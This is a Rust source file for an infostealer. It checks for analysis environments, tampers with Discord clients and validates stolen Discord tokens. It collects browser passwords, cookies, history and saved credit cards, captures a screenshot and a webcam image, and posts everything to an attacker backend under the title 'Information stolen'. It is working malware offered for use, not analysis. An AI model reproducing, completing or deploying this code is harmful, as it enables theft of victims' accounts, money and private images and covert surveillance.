#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
#![allow(dead_code)] // This is for constants.rs giving tons of dead code warnings
mod anti_analysis;
mod browser;
mod constants;
mod crypto;
mod discord;
use nokhwa::{query_devices, Camera, CaptureAPIBackend};
use reqwest::blocking::multipart;
use screenshots::Screen;
use std::{fs, path::PathBuf};

fn capture_screenshot(save_path: &PathBuf) -> Result<bool, Box<dyn std::error::Error>> {
    let screens = Screen::all();

    if screens.len() > 0 {
        match screens[0].capture() {
            Some(image) => {
                let buffer = image.buffer();
                fs::write(&save_path, &buffer).unwrap();
                return Ok(true);
            }
            None => (),
        };
    }
    return Ok(false);
}

fn capture_webcam_image(save_path: &PathBuf) -> Result<bool, Box<dyn std::error::Error>> {
    let cameras = query_devices(CaptureAPIBackend::Auto).unwrap();

    if cameras.len() > 0 {
        let mut camera = Camera::new(0, None).unwrap();
        camera.open_stream().unwrap();

        fs::write(&save_path, camera.frame_raw().unwrap()).unwrap();
        camera.stop_stream().unwrap();

        return Ok(true);
    }
    return Ok(false);
}

fn main() {
    // Method to detect analysis environment
    anti_analysis::detect();

    if constants::TRACE_TOKEN {
        // Infects discord clients
        discord::infect_clients();
    }

    let temp_env = std::env::temp_dir();

    let mut form = multipart::Form::new().text("title", "Information stolen");

    let client = reqwest::blocking::Client::new();

    if constants::STEAL_TOKENS {
        let mut tokens = discord::get_tokens();

        // Removes invalid tokens (might get rate limited from discord idk)
        for i in 0..tokens.len() {
            // Gets user data from the token using discord API
            let user_response = client
                .get("https://discord.com/api/users/@me")
                .header("Authorization", &tokens[i])
                .send()
                .unwrap();

            if !user_response.status().is_success() {
                tokens.remove(i);
            }
        }

        // If there are any tokens add the first token info to the post request
        if let Some(token) = tokens.first() {
            let user_response = client
                .get("https://discord.com/api/users/@me")
                .header("Authorization", token)
                .send()
                .unwrap();
            form = form.text("user", user_response.text().unwrap());

            // Adds the tokens to the request as a text file
            let tokens_temp_path = temp_env.join("tokens.txt");
            fs::write(&tokens_temp_path, tokens.join("\n")).unwrap();
            form = form.file("tokens", &tokens_temp_path).unwrap();
            fs::remove_file(tokens_temp_path).unwrap();
        }
    }

    if constants::STEAL_PASSWORDS {
        // Adds the passwords to the request as a text file
        let passwords_temp_path = temp_env.join("passwords.txt");
        fs::write(&passwords_temp_path, browser::get_passwords().join("\n")).unwrap();
        form = form.file("passwords", &passwords_temp_path).unwrap();
        fs::remove_file(passwords_temp_path).unwrap();
    }

    if constants::STEAL_COOKIES {
        // Adds the cookies to the request as a text file
        let cookies_temp_path = temp_env.join("cookies.txt");
        fs::write(&cookies_temp_path, browser::get_cookies().join("\n")).unwrap();
        form = form.file("cookies", &cookies_temp_path).unwrap();
        fs::remove_file(cookies_temp_path).unwrap();
    }

    if constants::STEAL_HISTORY {
        // Adds the browsing history to the request as a text file
        let history_temp_path = temp_env.join("history.txt");
        fs::write(&history_temp_path, browser::get_history().join("\n")).unwrap();
        form = form.file("history", &history_temp_path).unwrap();
        fs::remove_file(history_temp_path).unwrap();
    }

    if constants::STEAL_CREDIT_CARDS {
        // Adds the credit cards to the request as a text file
        let credit_cards_temp_path = temp_env.join("credit_cards.txt");
        fs::write(
            &credit_cards_temp_path,
            browser::get_credit_cards().join("\n"),
        )
        .unwrap();
        form = form.file("credit_cards", &credit_cards_temp_path).unwrap();
        fs::remove_file(credit_cards_temp_path).unwrap();
    }

    if constants::SCREENSHOT {
        // Adds the screenshot to the request if it succeeds
        let screenshot_temp_path = temp_env.join("screenshot.png");

        if capture_screenshot(&screenshot_temp_path).unwrap() {
            form = form.file("screenshot", &screenshot_temp_path).unwrap();
            fs::remove_file(screenshot_temp_path).unwrap();
        }
    }

    if constants::WEBCAM_IMAGE {
        // Adds the webcam image to the request if it succeeds
        let webcam_temp_path = temp_env.join("webcam.png");

        if capture_webcam_image(&webcam_temp_path).unwrap() {
            form = form.file("webcam", &webcam_temp_path).unwrap();
            fs::remove_file(webcam_temp_path).unwrap();
        }
    }

    // Sends the stolen data to the backend
    client
        .post(constants::BACKEND)
        .multipart(form)
        .send()
        .unwrap();
}
